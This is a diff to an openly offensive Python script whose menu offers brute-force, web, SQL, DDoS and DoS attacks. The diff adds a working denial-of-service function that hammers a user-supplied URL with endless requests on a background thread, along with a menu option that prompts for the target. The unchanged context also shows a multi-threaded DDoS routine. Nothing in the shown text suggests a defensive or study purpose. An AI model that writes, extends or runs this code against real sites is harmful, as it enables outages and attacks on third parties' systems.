@@ -135,14 +135,33 @@ def ddos_attack(url, threads=100):
         thread = threading.Thread(target=attack)
         thread.start()
 
+def dos_attack(url, rate_limit=10, delay_range=(1, 3)):
+    def attack():
+        while True:
+            try:
+                response = requests.get(url)
+                print(f"Sent request to {url} - Status code: {response.status_code}")
+                logging.info(f"Sent request to {url} - Status code: {response.status_code}")
+                time.sleep(random.uniform(*delay_range))
+            except requests.RequestException as e:
+                print(f"Error: {e}")
+                logging.error(f"Error: {e}")
+            time.sleep(rate_limit)
+
+    print(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
+    logging.info(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
+    attack_thread = threading.Thread(target=attack)
+    attack_thread.start()
+
 def main():
     print("Choose an option:")
     print("1. Brute Force")
     print("2. Web")
     print("3. SQL")
     print("4. DDoS Attack")
+    print("5. DoS Attack")
 
-    choice = input("Enter your choice (1, 2, 3 or 4): ")
+    choice = input("Enter your choice (1, 2, 3, 4 or 5): ")
 
     if choice == '1':
         domain, username = prompt_for_input()
@@ -194,8 +213,14 @@ def main():
         threads = int(input("Enter number of threads: "))
         ddos_attack(url, threads)
 
+    elif choice == '5':
+        url = input("Please enter a URL to attack: ")
+        rate_limit = int(input("Enter rate limit in seconds: "))
+        delay_range = (int(input("Enter minimum delay in seconds: ")), int(input("Enter maximum delay in seconds: ")))
+        dos_attack(url, rate_limit, delay_range)
+
     else:
-        print("Invalid choice. Please enter 1, 2, 3 or 4.")
+        print("Invalid choice. Please enter 1, 2, 3, 4 or 5.")
         sys.exit(1)
 
 if __name__ == '__main__':
